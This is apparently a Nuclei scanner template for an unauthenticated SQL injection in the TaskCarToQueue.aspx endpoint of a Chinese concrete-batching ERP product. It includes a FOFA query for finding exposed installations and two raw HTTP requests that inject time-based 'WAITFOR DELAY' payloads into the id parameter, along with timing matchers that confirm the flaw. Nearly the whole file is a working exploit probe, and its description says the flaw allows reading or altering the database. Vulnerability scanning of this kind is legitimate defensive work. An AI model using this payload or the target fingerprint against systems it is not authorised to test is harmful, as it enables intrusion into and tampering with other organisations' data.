id: concrete-erp-taskcartoqueue-sql
info:
  name: "商混 ERP 系统 TaskCarToQueue.aspx SQL 注入"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: title="商混ERP系统"
      技术路径：商混ERP系统中的 TaskCarToQueue.aspx 接口存在SQL注入漏洞，远程攻击者可通过该漏洞在未认证的情况下执行恶意SQL语句，进而实现数据库信息泄露或篡改。
  tags: 商混 ERP 系统
http:
- raw:
  - |
    GET /Dispatch/TaskCarToQueue.aspx?action=addqueue&id=%27WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
    Host: {{Hostname}}
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Connection: close
  - |
    GET /Dispatch/TaskCarToQueue.aspx?action=addqueue&id=%27WAITFOR+DELAY+%270:0:8%27-- HTTP/1.1
    Host: {{Hostname}}
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Connection: close
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
